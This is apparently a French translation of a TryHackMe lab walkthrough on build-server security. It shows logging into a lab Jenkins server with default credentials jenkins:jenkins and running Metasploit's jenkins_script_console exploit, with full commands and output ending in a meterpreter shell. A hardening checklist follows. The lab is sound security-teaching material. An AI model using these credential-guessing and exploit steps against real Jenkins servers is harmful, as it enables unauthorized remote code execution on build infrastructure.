Notre processus de construction est désormais protégé. Le prochain point d'attaque est le serveur de construction lui-même! Si un attaquant peut accéder ou contrôler notre serveur de build, cela les place dans une position privilégiée pour compromettre à la fois le pipeline et la build.

Construire des Basics Server

Avant de plonger dans l'attaque, discutons de la sécurité du serveur de construction de base. Le point le plus simple pour commencer est avec l'accès. Même dans les temps modernes, une attaque commune contre l'infrastructure de construction consiste à deviner les informations d'identification et à y accéder. Chaque fois que vous voyez un Jenkins serveur dans la nature, vous seriez surpris combien de fois `jenkins:jenkins` ferait l'affaire!

Pour sécuriser notre serveur de build, nous voulons restreindre l'accès à celui-ci. Vous constaterez souvent que plusieurs membres ont accès au même serveur de compilation. Dans ces cas, nous devons appliquer un accès granulaire pour nous assurer qu'un compromis d'un utilisateur ne conduirait pas à un compromis de toutes les versions. De plus, nous voulons limiter la probabilité qu'un utilisateur soit compromis en utilisant l'authentification multifacteur.

Exposé Build Server

Jetons un coup d'oeil au serveur de construction Jenkins dans le réseau à <http://jenkins.tryhackme.loc:8080/>. Vous devrez peut-être d'abord faire une autre mise à jour de votre `/etc/hosts` fichier avec l'adresse IP de la machine affichée dans votre diagramme de réseau. Vous devriez voir l'écran suivant:

![72cdd7eb8412a7dae0f5a29031c6d520](https://github.com/user-attachments/assets/e615b589-0ae8-4e48-92cb-74304317f325)

Tentons notre chance avec `jenkins:jenkins` et nous devrions être authentifiés!

![bc09936ce7f6b8bb843ca3306a31d4a2](https://github.com/user-attachments/assets/e170a86e-da7e-44cb-807b-dcc3a84e61b4)

Dans cette tâche, nous allons examiner l'utilisation de certains modules MSF pour attaquer le serveur de construction Jenkins. Sur l'AttackBox ou votre Kali VM, commencez Metasploit dans le terminal en utilisant `msfconsole`. Nous utiliserons le module jenkins_script_console de MSF:

**Terminal**

```
msf6 > use exploit/multi/http/jenkins_script_console
msf6 exploit(multi/http/jenkins_script_console) > show options

Module options (exploit/multi/http/jenkins_script_console):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   API_TOKEN                   no        The API token for the specified username
   PASSWORD                    no        The password for the specified username
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit
                                         .html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    no        The username to authenticate as
   VHOST                       no        HTTP server virtual host

   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0
                                       .0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.

Payload options (windows/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address

Exploit target:

   Id  Name
   --  ----
   0   Windows
```

Configurez votre module avec les valeurs correctes et exécutez pour un shell:

**Terminal**

```
msf6 exploit(multi/http/jenkins_script_console) > set target 1
target => 1
msf6 exploit(multi/http/jenkins_script_console) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/http/jenkins_script_console) > set password jenkins
password => jenkins
smsf6 exploit(multi/http/jenkins_script_console) > set username jenkins
username => jenkins
msf6 exploit(multi/http/jenkins_script_console) > set RHOST jenkins.tryhackme.loc
RHOST => jenkins.tryhackme.loc
msf6 exploit(multi/http/jenkins_script_console) > set targeturi /
targeturi => /
msf6 exploit(multi/http/jenkins_script_console) > set rport 8080
rport => 8080
msf6 exploit(multi/http/jenkins_script_console) > run

[*] Checking access to the script console
[*] Logging in...
[*] Using CSRF token: '887729f7a718bb81c8f00bff0df12b4bfb479ccd9cf91582f48107c457cb7d2e' (Jenkins-Crumb style v2)
[*] 52.50.36.84:8080 - Sending Linux stager...
[*] Command Stager progress - 100.00% done (751/751 bytes)
[*] Started bind TCP handler against 52.50.36.84:4444
[*] Sending stage (3045348 bytes) to 52.50.36.84
[*] Meterpreter session 1 opened (10.10.198.237:40199 -> 52.50.36.84:4444) at 2023-08-21 20:49:51 +0100

meterpreter > getuid
Server username: jenkins
```

Vous pouvez également chercher à effectuer une exploitation manuelle sur le Jenkins serveur. Cela impliquera d'accéder à la console de script et d'utiliser un script Groovy pour exécuter des commandes. N'hésitez pas à jouer!

Protéger le Build Server

Les étapes suivantes peuvent être suivies pour protéger à la fois votre serveur de construction et vos agents de construction:

1.  **Configuration de l'Agent de Construction**: Configurez les agents de construction pour communiquer uniquement avec le serveur de construction, en évitant les expositions externes.
2.  **Réseau Privé**: Placez des agents de construction dans un réseau privé, empêchant l'accès direct à Internet.
3.  **Pare-feu**: Utiliser des pare-feu pour restreindre les connexions entrantes au trafic nécessaire.
4.  **VPN**: Utilisez un VPN pour accéder au serveur de build et à ses agents en toute sécurité depuis des emplacements distants.
5.  **Authentification Based Token**: Utilisez des jetons d'agent de construction pour l'authentification, en ajoutant une couche de sécurité supplémentaire.
6.  **SSH Clés**: Pour SSHagents de construction basés sur - Utiliser sécurisé SSH clés d'authentification.
7.  **Surveillance Continue**: Surveillez régulièrement les activités et les journaux des agents de construction pour détecter tout comportement inhabituel.
8.  **Mises à jour Régulières**: Mettez à jour le serveur de build et les agents avec des correctifs de sécurité.
9.  **Audits de Sécurité**: Effectuer des audits de sécurité périodiques pour identifier et corriger les vulnérabilités.
10. **Supprimer les Défauts et Durcir la Configuration:** Assurez-vous de durcir votre serveur de construction et de supprimer toutes les informations d'identification par défaut et les configurations faibles.
